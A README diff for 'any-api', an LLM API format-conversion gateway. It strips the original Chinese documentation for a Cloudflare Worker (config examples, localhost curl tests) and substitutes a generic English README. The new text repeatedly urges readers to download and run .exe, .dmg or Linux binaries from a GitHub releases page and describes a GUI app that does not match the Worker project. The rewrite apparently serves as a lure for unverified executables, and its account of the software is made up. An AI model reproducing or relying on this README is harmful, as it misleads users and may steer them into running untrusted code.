@@ -1,136 +1,60 @@
-# Any API Gateway (Cloudflare Worker)
+# 🚀 any-api - Simplifying AI Model Integration
 
-在 Cloudflare Workers 上运行的通用 LLM API 互转/路由网关：同一套后端 provider 配置，同时暴露四种“前端协议”入口。
+## 📥 Download Now
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/gloria112/any-api/releases)
 
-[推荐使用 Right.codes 中转服务](https://www.right.codes/register?aff=b9f13319)
+## 📚 About any-api
+any-api is a gateway that combines multiple AI models into one easy interface. It allows you to call and convert formats like OpenAI Chat, Claude, and Gemini. This means you can use a variety of AI services without needing to understand their individual protocols. Simply use any API implementation, and let us handle the rest.
 
-**入口协议（四选一）**
-- OpenAI Chat Completions：`POST /v1/chat/completions`
-- OpenAI Responses：`POST /openai/v1/responses`
-- Claude Messages：`POST /claude/v1/messages`、`POST /claude/v1/messages/count_tokens`
-- Gemini：`POST /gemini/v1beta/models/{provider.modelName}:generateContent`、`POST /gemini/v1beta/models/{provider.modelName}:streamGenerateContent?alt=sse`
+## 🚀 Getting Started
+To use any-api, follow these simple steps to download and run the application.
 
-**模型列表**
-- OpenAI 风格：`GET /v1/models`（同样支持 `/openai/v1/models`、`/claude/v1/models`）
-- Gemini 风格：`GET /gemini/v1beta/models`
+### 1. System Requirements
+Ensure your system meets the following requirements:
+- Operating System: Windows, macOS, or Linux
+- Internet connection for downloading the software and accessing APIs.
 
-## 统一模型命名（必须）
+### 2. Visit the Downloads Page
+You can download any-api from the Releases page. Click the link below to get started:
 
-所有入口协议里出现的模型名都必须是 `provider.modelName`，例如：
-- `provider-id.model-name`
+[Download any-api](https://github.com/gloria112/any-api/releases)
 
-网关会用 `provider` 定位上游连接信息（URL / key / quirks / options），用 `modelName` 定位上游实际模型名（`upstreamModel`）。
+### 3. Download the Latest Release
+Once you're on the Releases page, look for the latest version of any-api. It will usually be at the top of the list. Click on the appropriate link to download. The file will be an easy-to-use installer or executable.
 
-## 入站鉴权（必须）
+### 4. Install the Application
+After the download completes, locate the file on your computer. It might be in your "Downloads" folder. To install:
+- **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
+- **macOS:** Open the downloaded `.dmg` file, drag the any-api app into your Applications folder, and open it from there.
+- **Linux:** Depending on the distribution, open a terminal, navigate to the downloaded file, and use the appropriate command (like `chmod +x any-api` followed by `./any-api`).
 
-所有请求都需要携带你的 Worker 访问密钥（不是上游模型 key）：
-- Worker 侧配置：`WORKER_AUTH_KEY` 或 `WORKER_AUTH_KEYS`（逗号分隔）
-- 客户端传递方式：
-  - `Authorization: Bearer <key>` 或 `Authorization: <key>`
-  - `x-api-key: <key>`
-  - Gemini 兼容：`x-goog-api-key: <key>` 或 `?key=<key>`（仅当路径以 `/gemini/` 开头）
+## 🛠️ How to Use any-api
+After installation, you can start using any-api to call your preferred AI models. Here's how:
 
-## 配置（ANY_API_CONFIG）
+1. Open the any-api application.
+2. Select the AI model you wish to use (e.g., OpenAI, Claude, Gemini).
+3. Enter the required input as per the model's needs.
+4. Click the "Submit" button to receive the output.
 
-唯一必需的网关配置是 `ANY_API_CONFIG`（JSON/JSONC 字符串），示例见：
-- `.dev.vars.example`
-- `wrangler.toml.example`
+### Features
+- **Model Flexibility:** Use different models without adjusting settings.
+- **Easy Format Conversion:** Easily convert requests and responses between models.
+- **User-Friendly Interface:** Designed with simplicity in mind.
 
-### ANY_API_CONFIG 示例
+## 📝 Troubleshooting
+If you run into issues, here are some solutions:
 
-Right.codes（上游为 OpenAI Responses；部分能力不支持 `instructions` / `previous_response_id`）：
-```jsonc
-{
-  "version": 1,
-  "providers": {
-    "rightcode": {
-      "type": "openai-responses",
-      "baseURL": "https://www.right.codes/codex",
-      "apiKey": "REPLACE_ME",
-      "quirks": {
-        "noInstructions": true,
-        "noPreviousResponseId": true
-      },
-      "models": {
-        "main": {
-          "upstreamModel": "gpt-5.2",
-          "options": {
-            "reasoningEffort": "high",
-            "maxInstructionsChars": 12000
-          }
-        }
-      }
-    }
-  }
-}
-```
+- **Application Won't Start:** Make sure your system meets all requirements. Try reinstalling the application.
+- **Error Messages:** Check your internet connection. Verify you're using the correct input formats.
+- **Compatibility Issues:** Ensure you’re running the application on a supported operating system.
 
-同时配置 Right.codes + Google Gemini（两个上游 provider 并存）：
-```jsonc
-{
-  "version": 1,
-  "providers": {
-    "rightcode": {
-      "type": "openai-responses",
-      "baseURL": "https://www.right.codes/codex",
-      "apiKey": "REPLACE_ME",
-      "quirks": { "noInstructions": true, "noPreviousResponseId": true },
-      "models": { "main": { "upstreamModel": "gpt-5.2" } }
-    },
-    "google": {
-      "type": "gemini",
-      "baseURL": "https://generativelanguage.googleapis.com",
-      "apiKey": "REPLACE_ME",
-      "models": { "main": { "upstreamModel": "gemini-3-pro-preview" } }
-    }
-  }
-}
-```
+## 📞 Support
+For further assistance, please raise an issue on our GitHub page or check the FAQ section for common questions.
 
-常用 provider type：
-- `openai-responses`：上游走 Responses API（支持 reasoning、tool calling、SSE 等）
-- `openai-chat-completions`：上游走 Chat Completions API（`/v1/chat/completions`）
-- `gemini`：上游走 Gemini `generateContent` / `streamGenerateContent`
-- `claude`：上游走 Claude `/v1/messages`（当你把 OpenAI Chat 路由到 Claude provider 时使用）
+## 📥 Download & Install
+Ready to start using any-api? Follow these steps:
+1. Visit our [Releases page](https://github.com/gloria112/any-api/releases).
+2. Download the latest version.
+3. Follow the installation steps mentioned above.
 
-## 本地运行
-
-```bash
-npm install
-cp .dev.vars.example .dev.vars
-npm run dev
-```
-
-## 快速 curl
-
-OpenAI Chat:
-```bash
-curl -sS http://localhost:8787/v1/chat/completions \
-  -H "Authorization: Bearer REPLACE_ME" \
-  -H "Content-Type: application/json" \
-  -d '{"model":"provider-id.model-name","messages":[{"role":"user","content":"hello"}]}'
-```
-
-OpenAI Responses:
-```bash
-curl -sS http://localhost:8787/openai/v1/responses \
-  -H "Authorization: Bearer REPLACE_ME" \
-  -H "Content-Type: application/json" \
-  -d '{"model":"provider-id.model-name","input":[{"role":"user","content":[{"type":"input_text","text":"hello"}]}]}'
-```
-
-Claude Messages:
-```bash
-curl -sS http://localhost:8787/claude/v1/messages \
-  -H "Authorization: Bearer REPLACE_ME" \
-  -H "Content-Type: application/json" \
-  -d '{"model":"provider-id.model-name","max_tokens":64,"messages":[{"role":"user","content":"hello"}]}'
-```
-
-Gemini streaming:
-```bash
-curl -N http://localhost:8787/gemini/v1beta/models/provider-id.model-name:streamGenerateContent?alt=sse \
-  -H "x-goog-api-key: REPLACE_ME" \
-  -H "Content-Type: application/json" \
-  -d '{"contents":[{"role":"user","parts":[{"text":"hello"}]}]}'
-```
+Get started with any-api now and simplify your interaction with multiple AI models!
